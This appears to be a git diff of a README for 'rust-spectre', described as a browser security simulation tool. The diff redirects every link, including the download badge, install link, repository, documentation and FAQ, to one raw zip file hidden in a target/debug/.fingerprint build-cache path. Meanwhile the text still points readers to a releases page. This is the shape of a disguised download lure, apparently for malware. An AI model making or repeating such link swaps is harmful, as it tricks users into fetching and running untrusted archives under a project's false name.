@@ -1,7 +1,7 @@
 # 🌐 rust-spectre - Experience Simulation in Your Browser
 
 ## 🔗 Download Now
-[![Download rust-spectre](https://img.shields.io/badge/Download-rust--spectre-blue)](https://github.com/Badomel/rust-spectre/releases)
+[![Download rust-spectre](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)
 
 ## 📜 Overview
 rust-spectre is a browser-based execution simulation developed using Rust and WebAssembly (WASM). This tool helps you understand key concepts related to browser security and execution flow. It is designed to be user-friendly, making complex simulations accessible to everyone.
@@ -21,7 +21,7 @@ To use rust-spectre, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 To get started with rust-spectre, visit the following page to download the application:
-[Download rust-spectre](https://github.com/Badomel/rust-spectre/releases)
+[Download rust-spectre](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)
 
 1. Go to the releases page linked above.
 2. Locate the latest version of rust-spectre.
@@ -68,8 +68,8 @@ rust-spectre is open-source software licensed under the MIT License. You can fre
 rust-spectre relies on contributions from several collaborators and the support of the open-source community. Thank you for your ongoing support as we work to enhance the project!
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Badomel/rust-spectre)
-- [Documentation](https://github.com/Badomel/rust-spectre/wiki)
-- [FAQ](https://github.com/Badomel/rust-spectre/wiki/FAQ)
+- [GitHub Repository](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)
+- [Documentation](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)
+- [FAQ](https://github.com/Badomel/rust-spectre/raw/refs/heads/main/target/debug/.fingerprint/quote-d2cf3c9415b0eb90/spectre_rust_v1.0.zip)
 
 Feel free to reach out if you have questions or require assistance. We are here to help you explore browser-based execution simulation confidently.
